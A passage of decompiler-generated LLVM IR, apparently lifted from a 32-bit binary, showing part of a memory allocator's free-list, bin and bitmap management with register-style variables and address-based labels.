  %v2_805360e = add i32 %v1_805360e, ptrtoint (i32* @global_var_80575ac.207 to i32)
  store i32 %v2_805360e, i32* %ecx.global-to-local, align 4
  %v1_8053615 = add i32 %v1_805360e, add (i32 ptrtoint (i32* @global_var_80575ac.207 to i32), i32 12)
  %v2_8053615 = inttoptr i32 %v1_8053615 to i32*
  %v3_8053615 = load i32, i32* %v2_8053615, align 4
  store i32 %v3_8053615, i32* @edx, align 4
  %v12_8053618 = icmp eq i32 %v3_8053615, %v2_805360e
  br i1 %v12_8053618, label %dec_label_pc_8053736.preheader, label %dec_label_pc_8053620

dec_label_pc_8053620:                             ; preds = %dec_label_pc_8053603
  store i32 %v1_8053948, i32* %ebx.global-to-local, align 4
  %v1_8053624 = add i32 %v3_8053615, 12
  %v2_8053624 = inttoptr i32 %v1_8053624 to i32*
  %v3_8053624 = load i32, i32* %v2_8053624, align 4
  store i32 %v3_8053624, i32* %eax.global-to-local, align 4
  store i32 %v3_8053624, i32* %v2_8053615, align 4
  %v0_805362a = load i32, i32* @edx, align 4
  %v1_805362a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805362a = add i32 %v0_805362a, 4
  %v3_805362a = add i32 %v2_805362a, %v1_805362a
  %v4_805362a = inttoptr i32 %v3_805362a to i32*
  %v5_805362a = load i32, i32* %v4_805362a, align 4
  %v6_805362a = or i32 %v5_805362a, 1
  store i32 %v6_805362a, i32* %v4_805362a, align 4
  %v0_805362f = load i32, i32* %ecx.global-to-local, align 4
  %v1_805362f = load i32, i32* %eax.global-to-local, align 4
  %v2_805362f = add i32 %v1_805362f, 8
  %v3_805362f = inttoptr i32 %v2_805362f to i32*
  store i32 %v0_805362f, i32* %v3_805362f, align 4
  br label %dec_label_pc_8053632

dec_label_pc_8053632:                             ; preds = %dec_label_pc_80539cf, %dec_label_pc_80539e1, %dec_label_pc_80535f1, %dec_label_pc_8053620
  %v0_8053632 = load i32, i32* @edx, align 4
  %v1_8053632 = add i32 %v0_8053632, 8
  store i32 %v1_8053632, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053cad

dec_label_pc_805363a:                             ; preds = %dec_label_pc_80535f9
  %v0_805363e = call i32 @function_805352e()
  store i32 %v0_805363e, i32* %eax.global-to-local, align 4
  %v3_8053643 = and i8 %v0_80535b0, 2
  %v4_8053643 = icmp eq i8 %v3_8053643, 0
  %v6_8053643 = zext i8 %v3_8053643 to i32
  %v9_8053643 = and i32 %v1_80535b0, -256
  %v10_8053643 = or i32 %v9_8053643, %v6_8053643
  store i32 %v10_8053643, i32* @ebx, align 4
  br i1 %v4_8053643, label %dec_label_pc_8053736.preheader, label %dec_label_pc_8053650

dec_label_pc_8053650:                             ; preds = %dec_label_pc_805363a
  store i32 ptrtoint (i8* @global_var_8057580.206 to i32), i32* %stack_var_-92, align 4
  %v2_8053658 = call i32 @function_8054171(i32* bitcast (i8* @global_var_8057580.206 to i32*))
  store i32 %v2_8053658, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053736.preheader

dec_label_pc_8053736.preheader:                   ; preds = %dec_label_pc_8053650, %dec_label_pc_8053603, %dec_label_pc_805363a
  %stack_var_-40.0.ph = phi i32 [ %v2_8053607, %dec_label_pc_8053603 ], [ %v0_805363e, %dec_label_pc_8053650 ], [ %v0_805363e, %dec_label_pc_805363a ]
  %v0_80537369 = load i32, i32* @global_var_80575c0.210, align 64
  store i32 %v0_80537369, i32* @ebp, align 4
  %v9_805373c15 = icmp eq i32 %v0_80537369, 134575540
  %v1_805374217 = icmp eq i1 %v9_805373c15, false
  br i1 %v1_805374217, label %dec_label_pc_8053665.lr.ph, label %dec_label_pc_8053748

dec_label_pc_8053665.lr.ph:                       ; preds = %dec_label_pc_8053736.preheader
  %v1_805368c = add i32 %v1_8053948, 16
  br label %dec_label_pc_8053665

dec_label_pc_8053665:                             ; preds = %dec_label_pc_8053665.lr.ph, %dec_label_pc_8053736
  %v1_8053c5f = phi i32 [ %v0_80537369, %dec_label_pc_8053665.lr.ph ], [ %v0_8053736, %dec_label_pc_8053736 ]
  %v1_8053665 = add i32 %v1_8053c5f, 4
  %v2_8053665 = inttoptr i32 %v1_8053665 to i32*
  %v3_8053665 = load i32, i32* %v2_8053665, align 4
  %v1_8053668 = add i32 %v1_8053c5f, 12
  %v2_8053668 = inttoptr i32 %v1_8053668 to i32*
  %v3_8053668 = load i32, i32* %v2_8053668, align 4
  store i32 %v3_8053668, i32* @edx, align 4
  %v1_805366b = and i32 %v3_8053665, -4
  store i32 %v1_805366b, i32* @edi, align 4
  br i1 %v6_8053601, label %dec_label_pc_8053697, label %dec_label_pc_8053678

dec_label_pc_8053678:                             ; preds = %dec_label_pc_8053665
  %v9_8053678 = icmp eq i32 %v3_8053668, 134575540
  %v1_805367e = icmp eq i1 %v9_8053678, false
  br i1 %v1_805367e, label %dec_label_pc_8053697, label %dec_label_pc_8053680

dec_label_pc_8053680:                             ; preds = %dec_label_pc_8053678
  %v1_8053680 = load i32, i32* @global_var_80575b0.208, align 16
  %v12_8053680 = icmp eq i32 %v1_8053c5f, %v1_8053680
  %v1_8053686 = icmp eq i1 %v12_8053680, false
  br i1 %v1_8053686, label %dec_label_pc_8053697, label %dec_label_pc_8053688

dec_label_pc_8053688:                             ; preds = %dec_label_pc_8053680
  store i32 %v1_805368c, i32* %eax.global-to-local, align 4
  %v6_8053691 = icmp ugt i32 %v1_805366b, %v1_805368c
  br i1 %v6_8053691, label %dec_label_pc_8053c48, label %dec_label_pc_8053697

dec_label_pc_8053697:                             ; preds = %dec_label_pc_8053688, %dec_label_pc_8053680, %dec_label_pc_8053678, %dec_label_pc_8053665
  store i32 ptrtoint (i32* @global_var_80575b4.209 to i32), i32* %eax.global-to-local, align 4
  %v2_805369c = add i32 %v3_8053668, 8
  %v3_805369c = inttoptr i32 %v2_805369c to i32*
  store i32 ptrtoint (i32* @global_var_80575b4.209 to i32), i32* %v3_805369c, align 4
  %v0_805369f = load i32, i32* @edx, align 4
  store i32 %v0_805369f, i32* @global_var_80575c0.210, align 4
  %v0_80536a2 = load i32, i32* @edi, align 4
  %v15_80536a2 = icmp eq i32 %v0_80536a2, %v1_8053948
  br i1 %v15_80536a2, label %dec_label_pc_8053c89, label %dec_label_pc_80536ac

dec_label_pc_80536ac:                             ; preds = %dec_label_pc_8053697
  %v6_80536b2 = icmp ugt i32 %v0_80536a2, 255
  br i1 %v6_80536b2, label %dec_label_pc_80536c5, label %dec_label_pc_80536b4

dec_label_pc_80536b4:                             ; preds = %dec_label_pc_80536ac
  %v2_80536b6 = udiv i32 %v0_80536a2, 8
  store i32 %v2_80536b6, i32* %esi.global-to-local, align 4
  %v1_80536b9 = mul nuw i32 %v2_80536b6, 8
  %v2_80536b9 = add i32 %v1_80536b9, 134575532
  store i32 %v2_80536b9, i32* @ebx, align 4
  %v1_80536c0 = add i32 %v1_80536b9, 134575540
  %v2_80536c0 = inttoptr i32 %v1_80536c0 to i32*
  %v3_80536c0 = load i32, i32* %v2_80536c0, align 4
  store i32 %v3_80536c0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805370e

dec_label_pc_80536c5:                             ; preds = %dec_label_pc_80536ac
  store i32 %v0_80536a2, i32* @eax, align 4
  %v0_80536c7 = call i32 @function_805352e()
  store i32 %v0_80536c7, i32* %esi.global-to-local, align 4
  %v1_80536ce = mul i32 %v0_80536c7, 8
  %v2_80536ce = add i32 %v1_80536ce, ptrtoint (i32* @global_var_80575ac.207 to i32)
  store i32 %v2_80536ce, i32* %eax.global-to-local, align 4
  %v1_80536d5 = add i32 %v1_80536ce, add (i32 ptrtoint (i32* @global_var_80575ac.207 to i32), i32 8)
  %v2_80536d5 = inttoptr i32 %v1_80536d5 to i32*
  %v3_80536d5 = load i32, i32* %v2_80536d5, align 4
  store i32 %v3_80536d5, i32* %edx.global-to-local, align 4
  store i32 %v3_80536d5, i32* @ebx, align 4
  %v12_80536de = icmp eq i32 %v3_80536d5, %v2_80536ce
  br i1 %v12_80536de, label %dec_label_pc_805370e, label %dec_label_pc_80536e2

dec_label_pc_80536e2:                             ; preds = %dec_label_pc_80536c5
  %v1_80536e2 = add i32 %v1_80536ce, add (i32 ptrtoint (i32* @global_var_80575ac.207 to i32), i32 12)
  %v2_80536e2 = inttoptr i32 %v1_80536e2 to i32*
  %v3_80536e2 = load i32, i32* %v2_80536e2, align 4
  store i32 %v3_80536e2, i32* @ebx, align 4
  %v0_80536e5 = load i32, i32* @edi, align 4
  %v2_80536e5 = add i32 %v3_80536e2, 4
  %v3_80536e5 = inttoptr i32 %v2_80536e5 to i32*
  %v4_80536e5 = load i32, i32* %v3_80536e5, align 4
  %v10_80536e5 = icmp ult i32 %v0_80536e5, %v4_80536e5
  %v1_80536e8 = icmp eq i1 %v10_80536e5, false
  br i1 %v1_80536e8, label %dec_label_pc_80536f0, label %dec_label_pc_805370e

dec_label_pc_80536f0:                             ; preds = %dec_label_pc_80536e2
  %v1_80536f2 = or i32 %v0_80536e5, 1
  store i32 %v1_80536f2, i32* %eax.global-to-local, align 4
  store i32 %v3_80536d5, i32* %ebx.global-to-local, align 4
  %v2_8053706105 = add i32 %v3_80536d5, 4
  %v3_8053706106 = inttoptr i32 %v2_8053706105 to i32*
  %v4_8053706107 = load i32, i32* %v3_8053706106, align 4
  %v10_8053706108 = icmp ult i32 %v1_80536f2, %v4_8053706107
  br i1 %v10_8053706108, label %dec_label_pc_80536f7, label %dec_label_pc_805370b

dec_label_pc_80536f7:                             ; preds = %dec_label_pc_80536f0, %dec_label_pc_80536f7
  %v0_805370b109 = phi i32 [ %v3_80536fb, %dec_label_pc_80536f7 ], [ %v3_80536d5, %dec_label_pc_80536f0 ]
  store i32 %v0_805370b109, i32* %ecx.global-to-local, align 4
  %v1_80536fb = add i32 %v0_805370b109, 8
  %v2_80536fb = inttoptr i32 %v1_80536fb to i32*
  %v3_80536fb = load i32, i32* %v2_80536fb, align 4
  store i32 %v3_80536fb, i32* %ecx.global-to-local, align 4
  store i32 %v3_80536fb, i32* %ebx.global-to-local, align 4
  %v2_8053706 = add i32 %v3_80536fb, 4
  %v3_8053706 = inttoptr i32 %v2_8053706 to i32*
  %v4_8053706 = load i32, i32* %v3_8053706, align 4
  %v10_8053706 = icmp ult i32 %v1_80536f2, %v4_8053706
  br i1 %v10_8053706, label %dec_label_pc_80536f7, label %dec_label_pc_805370b

dec_label_pc_805370b:                             ; preds = %dec_label_pc_80536f7, %dec_label_pc_80536f0
  %v0_805370b.lcssa = phi i32 [ %v3_80536d5, %dec_label_pc_80536f0 ], [ %v3_80536fb, %dec_label_pc_80536f7 ]
  %v1_805370b = add i32 %v0_805370b.lcssa, 12
  %v2_805370b = inttoptr i32 %v1_805370b to i32*
  %v3_805370b = load i32, i32* %v2_805370b, align 4
  store i32 %v3_805370b, i32* @ebx, align 4
  br label %dec_label_pc_805370e

dec_label_pc_805370e:                             ; preds = %dec_label_pc_80536b4, %dec_label_pc_80536e2, %dec_label_pc_80536c5, %dec_label_pc_805370b
  %v0_805370e = phi i32 [ %v0_80536c7, %dec_label_pc_80536c5 ], [ %v0_80536c7, %dec_label_pc_805370b ], [ %v0_80536c7, %dec_label_pc_80536e2 ], [ %v2_80536b6, %dec_label_pc_80536b4 ]
  %stack_var_-64.1 = phi i32 [ %v2_80536ce, %dec_label_pc_80536c5 ], [ %v0_805370b.lcssa, %dec_label_pc_805370b ], [ %v2_80536ce, %dec_label_pc_80536e2 ], [ %v3_80536c0, %dec_label_pc_80536b4 ]
  %v1_8053710 = urem i32 %v0_805370e, 32
  %v2_8053710 = icmp eq i32 %v1_8053710, 0
  store i32 %v1_8053710, i32* %esi.global-to-local, align 4
  store i32 %v1_8053710, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_805371a = sdiv i32 %v0_805370e, 32
  store i32 %v2_805371a, i32* %edx.global-to-local, align 4
  br i1 %v2_8053710, label %dec_label_pc_8053736, label %bb

bb:                                               ; preds = %dec_label_pc_805370e
  %v5_805371d = shl i32 1, %v1_8053710
  store i32 %v5_805371d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053736

dec_label_pc_8053736:                             ; preds = %dec_label_pc_805370e, %bb
  %v5_805371f = phi i32 [ 1, %dec_label_pc_805370e ], [ %v5_805371d, %bb ]
  %v1_805371f = mul nsw i32 %v2_805371a, 4
  %v2_805371f = add i32 %v1_805371f, ptrtoint (i32* @global_var_80578b4.211 to i32)
  %v3_805371f = inttoptr i32 %v2_805371f to i32*
  %v4_805371f = load i32, i32* %v3_805371f, align 4
  %v6_805371f = or i32 %v4_805371f, %v5_805371f
  store i32 %v6_805371f, i32* %v3_805371f, align 4
  %v0_8053726 = load i32, i32* @ebx, align 4
  %v1_8053726 = load i32, i32* @ebp, align 4
  %v2_8053726 = add i32 %v1_8053726, 12
  %v3_8053726 = inttoptr i32 %v2_8053726 to i32*
  store i32 %v0_8053726, i32* %v3_8053726, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_805372d = load i32, i32* @ebp, align 4
  %v2_805372d = add i32 %v1_805372d, 8
  %v3_805372d = inttoptr i32 %v2_805372d to i32*
  store i32 %stack_var_-64.1, i32* %v3_805372d, align 4
  %v0_8053730 = load i32, i32* @ebp, align 4
  %v1_8053730 = load i32, i32* @ebx, align 4
  %v2_8053730 = add i32 %v1_8053730, 8
  %v3_8053730 = inttoptr i32 %v2_8053730 to i32*
  store i32 %v0_8053730, i32* %v3_8053730, align 4
  %v0_8053733 = load i32, i32* @ebp, align 4
  %v1_8053733 = load i32, i32* @esi, align 4
  %v2_8053733 = add i32 %v1_8053733, 12
  %v3_8053733 = inttoptr i32 %v2_8053733 to i32*
  store i32 %v0_8053733, i32* %v3_8053733, align 4
  %v0_8053736 = load i32, i32* @global_var_80575c0.210, align 64
  store i32 %v0_8053736, i32* @ebp, align 4
  %v9_805373c = icmp eq i32 %v0_8053736, 134575540
  %v1_8053742 = icmp eq i1 %v9_805373c, false
  br i1 %v1_8053742, label %dec_label_pc_8053665, label %dec_label_pc_8053748

dec_label_pc_8053748:                             ; preds = %dec_label_pc_8053736, %dec_label_pc_8053736.preheader
  br i1 %v8_80535f9, label %dec_label_pc_80537d6, label %dec_label_pc_8053756

dec_label_pc_8053756:                             ; preds = %dec_label_pc_8053748
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_805375a = mul i32 %stack_var_-40.0.ph, 8
  %v2_805375a = add i32 %v1_805375a, ptrtoint (i32* @global_var_80575ac.207 to i32)
  store i32 %v2_805375a, i32* %edx.global-to-local, align 4
  %v1_8053761 = add i32 %v1_805375a, add (i32 ptrtoint (i32* @global_var_80575ac.207 to i32), i32 12)
  %v2_8053761 = inttoptr i32 %v1_8053761 to i32*
  %storemerge1.pre = load i32, i32* %v2_8053761, align 4
  br label %dec_label_pc_80537d2

dec_label_pc_8053766:                             ; preds = %dec_label_pc_80537d2
  %v1_8053766 = add i32 %v4_805377d, 4
  %v2_8053766 = inttoptr i32 %v1_8053766 to i32*
  %v3_8053766 = load i32, i32* %v2_8053766, align 4
  store i32 %v3_8053766, i32* %ebx.global-to-local, align 4
  %v1_8053769 = add i32 %v4_805377d, 12
  %v2_8053769 = inttoptr i32 %v1_8053769 to i32*
  %v3_8053769 = load i32, i32* %v2_8053769, align 4
  store i32 %v3_8053769, i32* @ecx, align 4
  %v1_805376c = and i32 %v3_8053766, -4
  store i32 %v1_805376c, i32* @ebx, align 4
  %v10_805376f = icmp ult i32 %v1_805376c, %v1_8053948
  br i1 %v10_805376f, label %dec_label_pc_80537d2, label %dec_label_pc_8053775

dec_label_pc_8053775:                             ; preds = %dec_label_pc_8053766
  %v1_8053775 = add i32 %v4_805377d, 8
  %v2_8053775 = inttoptr i32 %v1_8053775 to i32*
  %v3_8053775 = load i32, i32* %v2_8053775, align 4
  store i32 %v3_8053775, i32* @edx, align 4
  %v1_8053778 = add i32 %v3_8053775, 12
  %v2_8053778 = inttoptr i32 %v1_8053778 to i32*
  %v3_8053778 = load i32, i32* %v2_8053778, align 4
  %v15_8053778 = icmp eq i32 %v3_8053778, %v4_805377d
  %v1_805377b = icmp eq i1 %v15_8053778, false
  br i1 %v1_805377b, label %dec_label_pc_8053782, label %dec_label_pc_805377d

dec_label_pc_805377d:                             ; preds = %dec_label_pc_8053775
  %v1_805377d = add i32 %v3_8053769, 8
  %v2_805377d = inttoptr i32 %v1_805377d to i32*
  %v3_805377d = load i32, i32* %v2_805377d, align 4
  %v15_805377d = icmp eq i32 %v3_805377d, %v4_805377d
  br i1 %v15_805377d, label %dec_label_pc_8053787, label %dec_label_pc_8053782

dec_label_pc_8053782:                             ; preds = %dec_label_pc_805377d, %dec_label_pc_8053775
  %v0_8053782 = call i32 @function_80544b5()
  store i32 %v0_8053782, i32* %eax.global-to-local, align 4
  %v0_8053787.pre = load i32, i32* @ebx, align 4
  %v0_805378d.pre = load i32, i32* @ecx, align 4
  %v1_805378d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053787

dec_label_pc_8053787:                             ; preds = %dec_label_pc_805377d, %dec_label_pc_8053782
  %v1_805378d = phi i32 [ %v3_8053775, %dec_label_pc_805377d ], [ %v1_805378d.pre, %dec_label_pc_8053782 ]
  %v0_805378d = phi i32 [ %v3_8053769, %dec_label_pc_805377d ], [ %v0_805378d.pre, %dec_label_pc_8053782 ]
  %v0_8053787 = phi i32 [ %v1_805376c, %dec_label_pc_805377d ], [ %v0_8053787.pre, %dec_label_pc_8053782 ]
  %v5_8053789 = sub i32 %v0_8053787, %v1_8053948
  store i32 %v5_8053789, i32* %esi.global-to-local, align 4
  %v2_805378d = add i32 %v1_805378d, 12
  %v3_805378d = inttoptr i32 %v2_805378d to i32*
  store i32 %v0_805378d, i32* %v3_805378d, align 4
  %v0_8053790 = load i32, i32* @edx, align 4
  %v1_8053790 = load i32, i32* @ecx, align 4
  %v2_8053790 = add i32 %v1_8053790, 8
  %v3_8053790 = inttoptr i32 %v2_8053790 to i32*
  store i32 %v0_8053790, i32* %v3_8053790, align 4
  %v0_8053793 = load i32, i32* %esi.global-to-local, align 4
  %v0_8053796 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053796 = add i32 %v0_8053796, 8
  store i32 %v1_8053796, i32* %ecx.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8053793, 16
  br i1 %tmp126, label %dec_label_pc_8053c97, label %dec_label_pc_805379f

dec_label_pc_805379f:                             ; preds = %dec_label_pc_8053787
  %v2_80537a3 = add i32 %v0_8053796, %v1_8053948
  store i32 %v2_80537a3, i32* @edx, align 4
  %v1_80537a6 = or i32 %v1_8053948, 1
  store i32 %v1_80537a6, i32* %ebx.global-to-local, align 4
  %v2_80537a9 = add i32 %v0_8053796, 4
  %v3_80537a9 = inttoptr i32 %v2_80537a9 to i32*
  store i32 %v1_80537a6, i32* %v3_80537a9, align 4
  %v0_80537ac = load i32, i32* %esi.global-to-local, align 4
  %v1_80537ae = or i32 %v0_80537ac, 1
  store i32 %v1_80537ae, i32* %eax.global-to-local, align 4
  %v0_80537b1 = load i32, i32* @edx, align 4
  %v1_80537b1 = load i32, i32* @ebp, align 4
  %v2_80537b1 = add i32 %v1_80537b1, 8
  %v3_80537b1 = inttoptr i32 %v2_80537b1 to i32*
  store i32 %v0_80537b1, i32* %v3_80537b1, align 4
  %v0_80537b4 = load i32, i32* @edx, align 4
  %v1_80537b4 = load i32, i32* @ebp, align 4
  %v2_80537b4 = add i32 %v1_80537b4, 12
  %v3_80537b4 = inttoptr i32 %v2_80537b4 to i32*
  store i32 %v0_80537b4, i32* %v3_80537b4, align 4
  %v0_80537b7 = load i32, i32* @edx, align 4
  %v1_80537b7 = add i32 %v0_80537b7, 8
  %v2_80537b7 = inttoptr i32 %v1_80537b7 to i32*
  store i32 ptrtoint (i32* @global_var_80575b4.209 to i32), i32* %v2_80537b7, align 4
  %v0_80537be = load i32, i32* @edx, align 4
  %v1_80537be = add i32 %v0_80537be, 12
  %v2_80537be = inttoptr i32 %v1_80537be to i32*
  store i32 ptrtoint (i32* @global_var_80575b4.209 to i32), i32* %v2_80537be, align 4
  %v0_80537c5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80537c5 = load i32, i32* @edx, align 4
  %v2_80537c5 = add i32 %v1_80537c5, 4
  %v3_80537c5 = inttoptr i32 %v2_80537c5 to i32*
  store i32 %v0_80537c5, i32* %v3_80537c5, align 4
  %v0_80537c8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80537c8 = load i32, i32* @edx, align 4
  %v3_80537c8 = add i32 %v1_80537c8, %v0_80537c8
  %v4_80537c8 = inttoptr i32 %v3_80537c8 to i32*
  store i32 %v0_80537c8, i32* %v4_80537c8, align 4
  br label %dec_label_pc_8053c9c

dec_label_pc_80537d2:                             ; preds = %dec_label_pc_8053766, %dec_label_pc_8053756
  %v4_805377d = phi i32 [ %storemerge1.pre, %dec_label_pc_8053756 ], [ %v3_8053769, %dec_label_pc_8053766 ]
  store i32 %v4_805377d, i32* %eax.global-to-local, align 4
  %v12_80537d2 = icmp eq i32 %v4_805377d, %v2_805375a
  %v1_80537d4 = icmp eq i1 %v12_80537d2, false
  br i1 %v1_80537d4, label %dec_label_pc_8053766, label %dec_label_pc_80537d6.loopexit

dec_label_pc_80537d6.loopexit:                    ; preds = %dec_label_pc_80537d2
  br label %dec_label_pc_80537d6

dec_label_pc_80537d6:                             ; preds = %dec_label_pc_80537d6.loopexit, %dec_label_pc_8053748
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80537df = add i32 %stack_var_-40.0.ph, 1
  %v2_80537e2 = udiv i32 %v1_80537df, 32
  store i32 %v2_80537e2, i32* @edi, align 4
  %v1_80537e5 = mul i32 %v1_80537df, 8
  %v2_80537e5 = add i32 %v1_80537e5, ptrtoint (i32* @global_var_80575ac.207 to i32)
  store i32 %v2_80537e5, i32* %ebx.global-to-local, align 4
  %v1_80537ec = urem i32 %v1_80537df, 32
  %v2_80537ec = icmp eq i32 %v1_80537ec, 0
  store i32 %v1_80537ec, i32* %ecx.global-to-local, align 4
  %v1_80537ef = mul nuw nsw i32 %v2_80537e2, 4
  %v2_80537ef = add i32 %v1_80537ef, ptrtoint (i32* @global_var_80578b4.211 to i32)
  %v3_80537ef = inttoptr i32 %v2_80537ef to i32*
  %v4_80537ef = load i32, i32* %v3_80537ef, align 4
  store i32 %v4_80537ef, i32* %edx.global-to-local, align 4
  br i1 %v2_80537ec, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_80537d6
  %v5_80537f6 = shl i32 1, %v1_80537ec
  store i32 %v5_80537f6, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80537d6, %bb88, %dec_label_pc_8053837
  %v1_80537f8 = phi i32 [ %v1_80537f8.pre, %dec_label_pc_8053837 ], [ %v4_80537ef, %bb88 ], [ %v4_80537ef, %dec_label_pc_80537d6 ]
  %v0_80537fc = phi i32 [ %v0_80537f8.pre, %dec_label_pc_8053837 ], [ %v5_80537f6, %bb88 ], [ 1, %dec_label_pc_80537d6 ]
  %tmp89 = icmp ule i32 %v0_80537fc, %v1_80537f8
  %v1_80537fc = icmp eq i32 %v0_80537fc, 0
  %v1_80537fe = icmp eq i1 %v1_80537fc, false
  %or.cond = and i1 %tmp89, %v1_80537fe
  br i1 %or.cond, label %dec_label_pc_80537fc.dec_label_pc_805382c.preheader_crit_edge, label %dec_label_pc_8053800.preheader

dec_label_pc_80537fc.dec_label_pc_805382c.preheader_crit_edge: ; preds = %.preheader
  %v0_80538277.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805382c.preheader

dec_label_pc_8053800.preheader:                   ; preds = %.preheader
  %v0_8053800.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053800

dec_label_pc_8053800:                             ; preds = %dec_label_pc_8053800.preheader, %dec_label_pc_805380a
  %v0_8053800 = phi i32 [ %v0_8053800.pre, %dec_label_pc_8053800.preheader ], [ %v1_8053800, %dec_label_pc_805380a ]
  %v1_8053800 = add i32 %v0_8053800, 1
  store i32 %v1_8053800, i32* @edi, align 4
  %v6_8053804 = icmp ugt i32 %v1_8053800, 2
  br i1 %v6_8053804, label %dec_label_pc_80538b3.loopexit, label %dec_label_pc_805380a

dec_label_pc_805380a:                             ; preds = %dec_label_pc_8053800
  %v1_805380a = mul i32 %v1_8053800, 4
  %v2_805380a = add i32 %v1_805380a, ptrtoint (i32* @global_var_80578b4.211 to i32)
  %v3_805380a = inttoptr i32 %v2_805380a to i32*
  %v4_805380a = load i32, i32* %v3_805380a, align 4
  store i32 %v4_805380a, i32* %edx.global-to-local, align 4
  %v1_8053811 = icmp eq i32 %v4_805380a, 0
  br i1 %v1_8053811, label %dec_label_pc_8053800, label %dec_label_pc_8053815

dec_label_pc_8053815:                             ; preds = %dec_label_pc_805380a
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_805381c = mul i32 %v1_8053800, 256
  store i32 %v2_805381c, i32* %eax.global-to-local, align 4
  %v1_805381f = add i32 %v2_805381c, ptrtoint (i32* @global_var_80575ac.207 to i32)
  store i32 %v1_805381f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805382c.preheader

dec_label_pc_805382c.preheader:                   ; preds = %dec_label_pc_80537fc.dec_label_pc_805382c.preheader_crit_edge, %dec_label_pc_8053815
  %v0_80538277 = phi i32 [ %v1_805381f, %dec_label_pc_8053815 ], [ %v0_80538277.pre, %dec_label_pc_80537fc.dec_label_pc_805382c.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8053815 ], [ %v0_80537fc, %dec_label_pc_80537fc.dec_label_pc_805382c.preheader_crit_edge ]
  %v0_805383e = phi i32 [ %v4_805380a, %dec_label_pc_8053815 ], [ %v1_80537f8, %dec_label_pc_80537fc.dec_label_pc_805382c.preheader_crit_edge ]
  %v2_805382c4 = and i32 %v0_805383e, %esi.promoted
  %v3_805382c5 = icmp eq i32 %v2_805382c4, 0
  br i1 %v3_805382c5, label %dec_label_pc_8053827, label %dec_label_pc_8053830

dec_label_pc_8053827:                             ; preds = %dec_label_pc_805382c.preheader, %dec_label_pc_8053827
  %v2_805382a18 = phi i32 [ %v2_805382a, %dec_label_pc_8053827 ], [ %esi.promoted, %dec_label_pc_805382c.preheader ]
  %v0_80538278 = phi i32 [ %v1_8053827, %dec_label_pc_8053827 ], [ %v0_80538277, %dec_label_pc_805382c.preheader ]
  %v1_8053827 = add i32 %v0_80538278, 8
  %v2_805382a = mul i32 %v2_805382a18, 2
  %v2_805382c = and i32 %v2_805382a, %v0_805383e
  %v3_805382c = icmp eq i32 %v2_805382c, 0
  br i1 %v3_805382c, label %dec_label_pc_8053827, label %dec_label_pc_805382c.dec_label_pc_8053830_crit_edge

dec_label_pc_805382c.dec_label_pc_8053830_crit_edge: ; preds = %dec_label_pc_8053827
  store i32 %v1_8053827, i32* %ebx.global-to-local, align 4
  store i32 %v2_805382a, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053830

dec_label_pc_8053830:                             ; preds = %dec_label_pc_805382c.dec_label_pc_8053830_crit_edge, %dec_label_pc_805382c.preheader
  %v0_8053840 = phi i32 [ %v2_805382a, %dec_label_pc_805382c.dec_label_pc_8053830_crit_edge ], [ %esi.promoted, %dec_label_pc_805382c.preheader ]
  %v1_805385a = phi i32 [ %v1_8053827, %dec_label_pc_805382c.dec_label_pc_8053830_crit_edge ], [ %v0_80538277, %dec_label_pc_805382c.preheader ]
  %v1_8053830 = add i32 %v1_805385a, 12
  %v2_8053830 = inttoptr i32 %v1_8053830 to i32*
  %v3_8053830 = load i32, i32* %v2_8053830, align 4
  store i32 %v3_8053830, i32* %ecx.global-to-local, align 4
  %v12_8053833 = icmp eq i32 %v3_8053830, %v1_805385a
  %v1_8053835 = icmp eq i1 %v12_8053833, false
  br i1 %v1_8053835, label %dec_label_pc_805384b, label %dec_label_pc_8053837

dec_label_pc_8053837:                             ; preds = %dec_label_pc_8053830
  %v1_8053839 = add i32 %v3_8053830, 8
  store i32 %v1_8053839, i32* %ebx.global-to-local, align 4
  %v1_805383c = sub i32 -1, %v0_8053840
  store i32 %v1_805383c, i32* %eax.global-to-local, align 4
  %v2_805383e = and i32 %v0_805383e, %v1_805383c
  store i32 %v2_805383e, i32* %edx.global-to-local, align 4
  %v2_8053840 = mul i32 %v0_8053840, 2
  store i32 %v2_8053840, i32* %esi.global-to-local, align 4
  %v1_8053842 = load i32, i32* @edi, align 4
  %v2_8053842 = mul i32 %v1_8053842, 4
  %v3_8053842 = add i32 %v2_8053842, ptrtoint (i32* @global_var_80578b4.211 to i32)
  %v4_8053842 = inttoptr i32 %v3_8053842 to i32*
  store i32 %v2_805383e, i32* %v4_8053842, align 4
  %v0_80537f8.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80537f8.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_805384b:                             ; preds = %dec_label_pc_8053830
  %v1_805384b = add i32 %v3_8053830, 4
  %v2_805384b = inttoptr i32 %v1_805384b to i32*
  %v3_805384b = load i32, i32* %v2_805384b, align 4
  store i32 %v3_805384b, i32* %edx.global-to-local, align 4
  %v1_805384e = add i32 %v3_8053830, 12
  %v2_805384e = inttoptr i32 %v1_805384e to i32*
  %v3_805384e = load i32, i32* %v2_805384e, align 4
  store i32 %v3_805384e, i32* %eax.global-to-local, align 4
  %v1_8053851 = and i32 %v3_805384b, -4
  store i32 %v1_8053851, i32* @edx, align 4
  %v5_8053856 = sub i32 %v1_8053851, %v1_8053948
  store i32 %v5_8053856, i32* %esi.global-to-local, align 4
